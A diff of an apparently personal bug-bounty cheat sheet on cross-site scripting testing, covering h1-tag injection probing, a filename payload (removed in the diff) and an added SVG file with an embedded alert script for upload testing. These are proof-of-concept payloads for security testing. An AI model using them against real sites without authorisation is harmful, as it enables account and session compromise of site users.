@@ -1,7 +1,4 @@
 <h1>Cross Site Scriping</h1><br>
-```languageName
-<h1>test</h1>
-```
 <h2>first glance methodology </h2>
 On a website that allows you to register an account, test every feature avaliable with the payload <.h1>test<./h1>(remove the . it was rendering my h1 tag on this page). Do this on every feature that allows input. <br>
 Navigate the application and see if theres any places your H1 tag is interpreted. <br>
@@ -47,7 +44,18 @@ Injecting anchor tag without whitespaces -breaking up characters with decoded va
  <br>
  <h3> File Upload XSS </h3><br>
  If you find a file upload feature, try naming the file to an xss payload. Use burp intercept to rename files <br>
- Give file xss payload name cp somefile.txt \"\>\<img\ src\ onerror=prompt\(1\)\> <br>
+ Does the app allow .svg files to be uploaded? if yes, enter the code within an svg file <br>
+ <code><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('XSS!');
+   </script>
+</svg>
+ </code>
+
 <br>
 <h2>A href bypasses</h2>
 If exploiting <a. href></a> xss and "javasript" is blocked by WAF or URL then try the below. <br>
